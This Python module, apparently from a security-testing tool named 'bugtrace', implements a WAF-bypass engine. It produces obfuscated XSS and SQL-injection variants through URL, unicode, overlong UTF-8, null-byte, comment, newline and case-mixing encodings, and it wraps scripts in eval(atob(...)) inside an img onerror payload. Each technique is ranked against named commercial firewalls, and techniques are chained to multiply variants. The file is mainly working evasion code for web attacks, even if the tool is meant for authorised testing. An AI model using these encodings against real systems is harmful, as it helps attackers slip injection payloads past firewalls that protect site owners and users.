"""
Advanced Encoding Techniques for WAF Bypass.

Contains 12+ encoding/obfuscation methods organized by WAF effectiveness.
"""

import base64
import urllib.parse
import html
from typing import List, Callable, Optional, Tuple
from dataclasses import dataclass
from bugtrace.utils.logger import get_logger

logger = get_logger("waf.encodings")


@dataclass
class EncodingTechnique:
    """Represents a single encoding technique."""
    name: str
    description: str
    encoder: Callable[[str], str]
    effective_against: List[str]  # WAF names this works well against
    priority: int  # Lower = try first (1-10)


class EncodingTechniques:
    """
    Collection of WAF bypass encoding techniques.

    Usage:
        et = EncodingTechniques()
        encoded_payloads = et.encode_payload("<script>alert(1)</script>", waf="cloudflare")
    """

    def __init__(self):
        self.techniques: List[EncodingTechnique] = self._build_techniques()

    def _build_techniques(self) -> List[EncodingTechnique]:
        """Build the list of all encoding techniques."""
        return (
            self._build_tier1_universal() +
            self._build_tier2_cloudflare() +
            self._build_tier3_advanced() +
            self._build_tier4_exotic() +
            self._build_tier5_evasion()
        )

    def _build_tier1_universal(self) -> List[EncodingTechnique]:
        """Universal encodings that work against most WAFs."""
        return [
            EncodingTechnique(
                name="url_encode",
                description="Standard URL encoding",
                encoder=self._url_encode,
                effective_against=["modsecurity", "nginx_naxsi", "generic"],
                priority=1
            ),
            EncodingTechnique(
                name="double_url_encode",
                description="Double URL encoding",
                encoder=self._double_url_encode,
                effective_against=["modsecurity", "aws_waf", "nginx_naxsi"],
                priority=2
            ),
            EncodingTechnique(
                name="unicode_encode",
                description="Unicode escape sequences",
                encoder=self._unicode_encode,
                effective_against=["cloudflare", "akamai", "imperva"],
                priority=3
            ),
        ]

    def _build_tier2_cloudflare(self) -> List[EncodingTechnique]:
        """Cloudflare-specific bypass techniques."""
        return [
            EncodingTechnique(
                name="html_entity_encode",
                description="HTML entity encoding",
                encoder=self._html_entity_encode,
                effective_against=["cloudflare", "sucuri"],
                priority=4
            ),
            EncodingTechnique(
                name="html_entity_hex",
                description="HTML hex entity encoding",
                encoder=self._html_entity_hex,
                effective_against=["cloudflare", "f5_bigip"],
                priority=5
            ),
            EncodingTechnique(
                name="case_mixing",
                description="Random case mixing",
                encoder=self._case_mixing,
                effective_against=["cloudflare", "modsecurity"],
                priority=6
            ),
        ]

    def _build_tier3_advanced(self) -> List[EncodingTechnique]:
        """Advanced bypass techniques."""
        return [
            EncodingTechnique(
                name="null_byte_injection",
                description="Insert null bytes",
                encoder=self._null_byte_injection,
                effective_against=["modsecurity", "fortiweb"],
                priority=7
            ),
            EncodingTechnique(
                name="comment_injection",
                description="Insert inline comments",
                encoder=self._comment_injection,
                effective_against=["modsecurity", "aws_waf"],
                priority=8
            ),
            EncodingTechnique(
                name="whitespace_obfuscation",
                description="Use alternative whitespace characters",
                encoder=self._whitespace_obfuscation,
                effective_against=["cloudflare", "akamai"],
                priority=9
            ),
        ]

    def _build_tier4_exotic(self) -> List[EncodingTechnique]:
        """Exotic bypass techniques."""
        return [
            EncodingTechnique(
                name="base64_encode",
                description="Base64 encoding (for specific contexts)",
                encoder=self._base64_encode,
                effective_against=["generic"],
                priority=10
            ),
            EncodingTechnique(
                name="overlong_utf8",
                description="Overlong UTF-8 encoding",
                encoder=self._overlong_utf8,
                effective_against=["modsecurity", "nginx_naxsi"],
                priority=11
            ),
            EncodingTechnique(
                name="backslash_escape",
                description="Backslash escape sequences",
                encoder=self._backslash_escape,
                effective_against=["imperva", "barracuda"],
                priority=12
            ),
            EncodingTechnique(
                name="base64_xss_wrap",
                description="Wrap JS in atob() for XSS WAF bypass",
                encoder=self._base64_encode_xss,
                effective_against=["cloudflare", "akamai", "aws_waf", "modsecurity"],
                priority=5  # Higher priority for XSS contexts
            ),
        ]

    def _build_tier5_evasion(self) -> List[EncodingTechnique]:
        """Advanced evasion techniques (TASK-76)."""
        return [
            EncodingTechnique(
                name="concat_string",
                description="Break strings with concatenation",
                encoder=self._concat_string,
                effective_against=["modsecurity", "cloudflare", "aws_waf"],
                priority=6
            ),
            EncodingTechnique(
                name="hex_encode",
                description="Hex encode characters",
                encoder=self._hex_encode,
                effective_against=["modsecurity", "nginx_naxsi", "generic"],
                priority=7
            ),
            EncodingTechnique(
                name="scientific_notation",
                description="Use scientific notation for SQL numbers",
                encoder=self._scientific_notation,
                effective_against=["modsecurity", "aws_waf"],
                priority=8
            ),
            EncodingTechnique(
                name="buffer_overflow",
                description="Prepend long padding to bypass length limits",
                encoder=self._buffer_overflow,
                effective_against=["generic", "nginx_naxsi"],
                priority=9
            ),
            EncodingTechnique(
                name="newline_injection",
                description="Insert newlines to break regex patterns",
                encoder=self._newline_injection,
                effective_against=["modsecurity", "cloudflare"],
                priority=10
            ),
        ]

    # =========================================================================
    # ENCODING IMPLEMENTATIONS
    # =========================================================================

    def _url_encode(self, payload: str) -> str:
        """Standard URL encoding."""
        return urllib.parse.quote(payload, safe='')

    def _double_url_encode(self, payload: str) -> str:
        """Double URL encoding - encode twice."""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    def _unicode_encode(self, payload: str) -> str:
        """
        Convert characters to Unicode escape sequences.
        <script> -> \u003cscript\u003e
        """
        result = ""
        for char in payload:
            if char in '<>"\'/\\':
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    def _html_entity_encode(self, payload: str) -> str:
        """
        HTML entity encoding (decimal).
        < -> &#60;
        """
        result = ""
        for char in payload:
            if char in '<>"\'/&':
                result += f"&#{ord(char)};"
            else:
                result += char
        return result

    def _html_entity_hex(self, payload: str) -> str:
        """
        HTML hex entity encoding.
        < -> &#x3c;
        """
        result = ""
        for char in payload:
            if char in '<>"\'/&':
                result += f"&#x{ord(char):x};"
            else:
                result += char
        return result

    def _case_mixing(self, payload: str) -> str:
        """
        Random case mixing.
        <script> -> <ScRiPt>
        """
        import random
        result = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                result += char.upper() if i % 2 == 0 else char.lower()
            else:
                result += char
        return result

    def _null_byte_injection(self, payload: str) -> str:
        """
        Insert null bytes to break pattern matching.
        <script> -> <scr%00ipt>
        """
        # Insert null byte after 'scr' in script, 'ale' in alert, etc.
        replacements = [
            ("script", "scr%00ipt"),
            ("alert", "ale%00rt"),
            ("onerror", "oner%00ror"),
            ("onload", "onlo%00ad"),
        ]
        result = payload
        for original, replacement in replacements:
            result = result.replace(original, replacement)
        return result

    def _comment_injection(self, payload: str) -> str:
        """
        Insert inline comments (for SQL/JS).
        ' OR 1=1 -> ' O/**/R 1/**/=/**/1
        alert(1) -> al/**/ert(1)
        """
        replacements = [
            ("OR", "O/**/R"),
            ("AND", "A/**/ND"),
            ("SELECT", "SEL/**/ECT"),
            ("UNION", "UNI/**/ON"),
            ("alert", "al/**/ert"),
            ("script", "scr/**/ipt"),
        ]
        result = payload
        for original, replacement in replacements:
            result = result.replace(original, replacement)
            result = result.replace(original.lower(), replacement.lower())
        return result

    def _whitespace_obfuscation(self, payload: str) -> str:
        """
        Replace spaces with alternative whitespace characters.
        Uses tab (%09), newline (%0a), carriage return (%0d).
        """
        import random
        whitespace_chars = ["%09", "%0a", "%0d", "%0c"]
        result = ""
        for char in payload:
            if char == " ":
                result += random.choice(whitespace_chars)
            else:
                result += char
        return result

    def _base64_encode(self, payload: str) -> str:
        """
        Base64 encode the payload.
        Useful for specific contexts that decode base64.
        """
        return base64.b64encode(payload.encode()).decode()

    def _overlong_utf8(self, payload: str) -> str:
        """
        Overlong UTF-8 encoding.
        < (0x3C) -> %c0%bc (overlong form)
        """
        # Common overlong encodings for dangerous characters
        overlong_map = {
            '<': '%c0%bc',
            '>': '%c0%be',
            "'": '%c0%a7',
            '"': '%c0%a2',
            '/': '%c0%af',
        }
        result = ""
        for char in payload:
            if char in overlong_map:
                result += overlong_map[char]
            else:
                result += char
        return result

    def _backslash_escape(self, payload: str) -> str:
        r"""
        Use backslash escapes.
        <script> -> <\script>
        """
        replacements = [
            ("script", "\\script"),
            ("alert", "\\alert"),
            ("img", "\\img"),
            ("svg", "\\svg"),
        ]
        result = payload
        for original, replacement in replacements:
            result = result.replace(original, replacement)
        return result

    # =========================================================================
    # TIER 5 ENCODING IMPLEMENTATIONS (TASK-76)
    # =========================================================================

    def _concat_string(self, payload: str) -> str:
        """
        Break strings using concatenation.
        'admin' -> 'adm'+'in'
        SELECT -> SEL'+'ECT
        """
        replacements = [
            ("admin", "adm'+'in"),
            ("SELECT", "SEL'+'ECT"),
            ("UNION", "UNI'+'ON"),
            ("script", "scr'+'ipt"),
            ("alert", "al'+'ert"),
            ("onerror", "oner'+'ror"),
        ]
        result = payload
        for original, replacement in replacements:
            result = result.replace(original, replacement)
            result = result.replace(original.lower(), replacement.lower())
        return result

    def _hex_encode(self, payload: str) -> str:
        """
        Hex encode dangerous characters.
        < -> 0x3c
        """
        hex_map = {
            '<': '0x3c',
            '>': '0x3e',
            "'": '0x27',
            '"': '0x22',
            '=': '0x3d',
        }
        result = ""
        for char in payload:
            if char in hex_map:
                result += hex_map[char]
            else:
                result += char
        return result

    def _scientific_notation(self, payload: str) -> str:
        """
        Use scientific notation for SQL numbers.
        1=1 -> 1e0=1e0
        """
        import re
        # Replace standalone numbers with scientific notation
        result = re.sub(r'\b(\d+)\b', lambda m: f"{m.group(1)}e0", payload)
        return result

    def _buffer_overflow(self, payload: str) -> str:
        """
        Prepend long padding to potentially bypass length-based filters.
        """
        # Add harmless padding that some WAFs might truncate
        padding = "A" * 100 + "%00"
        return padding + payload

    def _newline_injection(self, payload: str) -> str:
        """
        Insert newlines to break regex patterns.
        <script> -> <scr\nipt>
        """
        replacements = [
            ("script", "scr\nipt"),
            ("SELECT", "SEL\nECT"),
            ("UNION", "UNI\nON"),
            ("alert", "ale\nrt"),
        ]
        result = payload
        for original, replacement in replacements:
            result = result.replace(original, replacement)
            result = result.replace(original.lower(), replacement.lower())
        return result

    def _base64_encode_xss(self, payload: str) -> str:
        """
        Wrap XSS payload in atob() for WAF bypass.
        <script>alert(1)</script> -> <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
        """
        import re

        # Extract JS code from common patterns
        js_code = None

        # Pattern: <script>CODE</script>
        match = re.search(r'<script[^>]*>(.*?)</script>', payload, re.IGNORECASE | re.DOTALL)
        if match:
            js_code = match.group(1).strip()

        # Pattern: onerror=CODE or onload=CODE etc.
        if not js_code:
            match = re.search(r'on\w+\s*=\s*["\']?([^"\'>\s]+)', payload, re.IGNORECASE)
            if match:
                js_code = match.group(1).strip()

        if not js_code:
            # If it's a raw JS payload (e.g., from polyglots), try to encode it directly
            # assuming it might be executed in an eval-like context
            js_code = payload.strip()

        # Encode the JS code
        encoded_js = base64.b64encode(js_code.encode()).decode()

        # Return as img/onerror with atob
        return f"<img src=x onerror=eval(atob('{encoded_js}'))>"

    # =========================================================================
    # PUBLIC API
    # =========================================================================

    def encode_payload(
        self,
        payload: str,
        waf: str = "unknown",
        max_variants: int = 5
    ) -> List[str]:
        """
        Encode a payload using techniques effective against the detected WAF.

        Args:
            payload: Original payload to encode
            waf: Detected WAF name (e.g., "cloudflare", "modsecurity")
            max_variants: Maximum number of encoded variants to return

        Returns:
            List of encoded payload variants, ordered by effectiveness
        """
        # Filter and sort techniques by effectiveness against this WAF
        if waf == "unknown":
            # Use all techniques sorted by priority
            relevant_techniques = sorted(self.techniques, key=lambda t: t.priority)
        else:
            # Prioritize techniques effective against this specific WAF
            def waf_score(tech: EncodingTechnique) -> int:
                if waf in tech.effective_against:
                    return tech.priority
                return tech.priority + 100  # Deprioritize non-matching

            relevant_techniques = sorted(self.techniques, key=waf_score)

        # Generate encoded variants
        variants = []
        for tech in relevant_techniques[:max_variants]:
            try:
                encoded = tech.encoder(payload)
                if encoded != payload:  # Only include if encoding changed something
                    variants.append(encoded)
                    logger.debug(f"Encoded with {tech.name}: {payload[:30]}... -> {encoded[:30]}...")
            except Exception as e:
                logger.debug(f"Encoding failed with {tech.name}: {e}")

        return variants

    def get_all_variants(self, payload: str) -> List[str]:
        """
        Generate ALL encoded variants of a payload.
        Use this for exhaustive testing.
        """
        return self.encode_payload(payload, waf="unknown", max_variants=len(self.techniques))

    def get_technique_names(self) -> List[str]:
        """Return list of all technique names."""
        return [t.name for t in self.techniques]

    def get_technique_by_name(self, name: str) -> Optional[EncodingTechnique]:
        """Get a specific encoding technique by name."""
        for tech in self.techniques:
            if tech.name == name:
                return tech
        return None

    def encode_with_combinations(
        self,
        payload: str,
        waf: str = "unknown",
        max_combinations: int = 3,
        max_variants: int = 10
    ) -> List[Tuple[str, List[str]]]:
        """
        Generate payload variants using strategy combinations (TASK-74).

        Args:
            payload: Original payload to encode
            waf: Detected WAF name
            max_combinations: Max number of techniques to chain (2-3 recommended)
            max_variants: Maximum number of variants to return

        Returns:
            List of (encoded_payload, [technique_names]) tuples
        """
        import itertools

        relevant_techniques = self._get_waf_prioritized_techniques(waf)
        variants = []

        # Single technique encodings
        variants.extend(self._generate_single_encodings(payload, relevant_techniques))

        # Multi-technique combinations
        if max_combinations >= 2:
            variants.extend(self._generate_double_encodings(payload, relevant_techniques, max_variants, variants))
        if max_combinations >= 3:
            variants.extend(self._generate_triple_encodings(payload, relevant_techniques, max_variants, variants))

        return self._deduplicate_variants(variants)[:max_variants]

    def _get_waf_prioritized_techniques(self, waf: str) -> List[EncodingTechnique]:
        """Get techniques prioritized for the detected WAF."""
        if waf == "unknown":
            return sorted(self.techniques, key=lambda t: t.priority)[:6]

        def waf_score(tech: EncodingTechnique) -> int:
            if waf in tech.effective_against:
                return tech.priority
            return tech.priority + 100

        return sorted(self.techniques, key=waf_score)[:6]

    def _generate_single_encodings(self, payload: str, techniques: List[EncodingTechnique]) -> List[Tuple[str, List[str]]]:
        """Generate single-technique encoded variants."""
        variants = []
        for tech in techniques:
            try:
                encoded = tech.encoder(payload)
                if encoded != payload:
                    variants.append((encoded, [tech.name]))
            except Exception as e:
                logger.debug(f"Encoding variant {tech.name} failed: {e}")
        return variants

    def _generate_double_encodings(
        self,
        payload: str,
        techniques: List[EncodingTechnique],
        max_variants: int,
        existing_variants: List
    ) -> List[Tuple[str, List[str]]]:
        """Generate two-technique combination variants."""
        import itertools
        variants = []

        for tech1, tech2 in itertools.permutations(techniques, 2):
            if len(existing_variants) + len(variants) >= max_variants:
                break
            try:
                step1 = tech1.encoder(payload)
                step2 = tech2.encoder(step1)
                if step2 != payload and step2 != step1:
                    variants.append((step2, [tech1.name, tech2.name]))
            except Exception as e:
                logger.debug(f"Encoding chain {tech1.name}+{tech2.name} failed: {e}")

        return variants

    def _generate_triple_encodings(
        self,
        payload: str,
        techniques: List[EncodingTechnique],
        max_variants: int,
        existing_variants: List
    ) -> List[Tuple[str, List[str]]]:
        """Generate three-technique combination variants."""
        import itertools
        variants = []

        for tech1, tech2, tech3 in itertools.permutations(techniques[:4], 3):
            if len(existing_variants) + len(variants) >= max_variants:
                break
            try:
                step1 = tech1.encoder(payload)
                step2 = tech2.encoder(step1)
                step3 = tech3.encoder(step2)
                if step3 != payload and step3 != step2:
                    variants.append((step3, [tech1.name, tech2.name, tech3.name]))
            except Exception as e:
                logger.debug(f"Encoding chain {tech1.name}+{tech2.name}+{tech3.name} failed: {e}")

        return variants

    def _deduplicate_variants(self, variants: List[Tuple[str, List[str]]]) -> List[Tuple[str, List[str]]]:
        """Remove duplicate encoded payloads."""
        seen = set()
        unique_variants = []
        for encoded, techniques in variants:
            if encoded not in seen:
                seen.add(encoded)
                unique_variants.append((encoded, techniques))
        return unique_variants


# Singleton instance
encoding_techniques = EncodingTechniques()
